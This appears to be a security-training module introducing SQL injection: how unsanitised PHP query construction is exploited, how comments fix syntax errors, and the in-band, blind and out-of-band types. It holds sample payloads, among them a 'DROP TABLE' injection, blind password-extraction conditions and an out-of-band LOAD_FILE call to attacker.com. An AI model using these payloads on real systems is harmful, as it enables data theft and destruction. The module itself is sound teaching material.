# Introduction to SQL Injections

SQL injection happens at the boundary between user input and SQL query construction. When a web application takes what a user typed and inserts it directly into a query string without sanitisation, the database cannot distinguish between the developer's intended query structure and the attacker's injected commands.

***

## How Injection Happens in Code

A vulnerable PHP search function looks like this:

```php
$searchInput = $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

With normal input `admin`, the query becomes:

```sql
SELECT * FROM logins WHERE username LIKE '%admin'
```

With injected input `1'; DROP TABLE users;`, the query becomes:

```sql
SELECT * FROM logins WHERE username LIKE '%1'; DROP TABLE users;'
```

The single quote after `1` breaks out of the string context the developer opened with `'%`. Everything after that is interpreted as SQL code, not user data.

***

## The Syntax Error Problem

Most raw injection attempts produce a syntax error because the original query's trailing characters create invalid SQL after the injection. The final dangling quote in the example above causes exactly this:

```sql
SELECT * FROM logins WHERE username LIKE '%1'; DROP TABLE users;'
--                                                              ^ unmatched quote
```

Making an injection work requires the final constructed query to be syntactically valid. Two solutions exist:

- **SQL comments** (`--`, `#`): Comment out everything after the injection point, eliminating trailing characters
- **Quote balancing**: Carefully counting and matching quotes so the overall string structure remains valid

Comments are by far the more practical and reliable approach and form the basis of most working payloads.

***

## Types of SQL Injection

The classification is based on how output reaches the attacker:

| Type | Output Method | Subtypes |
|------|-------------|---------|
| In-band | Returned directly in the HTTP response | Union-based, Error-based |
| Blind | No direct output, inferred from behaviour | Boolean-based, Time-based |
| Out-of-band | Exfiltrated via a separate channel | DNS exfiltration, HTTP callbacks |

### In-Band

**Union-based**: The attacker appends a `UNION SELECT` to the original query, and the results of the injected query appear alongside or instead of the original results. Requires knowing the number of columns and compatible data types.

**Error-based**: Intentionally causes a database error that includes query output in the error message. Works when the application displays raw database errors to the user.

### Blind

**Boolean-based**: The page renders differently depending on whether an injected condition is true or false. The attacker asks yes/no questions to extract data one bit at a time:

```sql
-- Is the first character of the admin password 'a'?
' AND SUBSTRING(password,1,1)='a'--
-- Page loads normally: yes
-- Page shows empty/error: no
```

**Time-based**: Used when the page looks identical regardless of the query result. A conditional `SLEEP()` delays the response only when the condition is true:

```sql
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(3), 0)--
-- 3 second delay: first char is 'a'
-- Instant response: first char is not 'a'
```

### Out-of-Band

Used when there is no visible output and no measurable timing difference. The attacker uses database functions that make DNS lookups or HTTP requests to an attacker-controlled server, carrying the exfiltrated data in the request:

```sql
-- MySQL example using LOAD_FILE via UNC path (Windows only)
SELECT LOAD_FILE('\\\\attacker.com\\share\\file')
```

This is the most complex injection type and requires specific database configurations to be enabled.

***

## Why This Module Focuses on UNION-Based

UNION-based injection is the most instructive starting point because it produces visible, immediate output. The attacker can see exactly what the database returns with each payload, making it easier to understand cause and effect. The techniques learned here (column counting, data type matching, extracting from `information_schema`) apply directly to the more advanced blind techniques, where the same queries run but output is inferred rather than read directly. Starting with UNION-based injection builds the mental model that all subsequent injection types build upon.
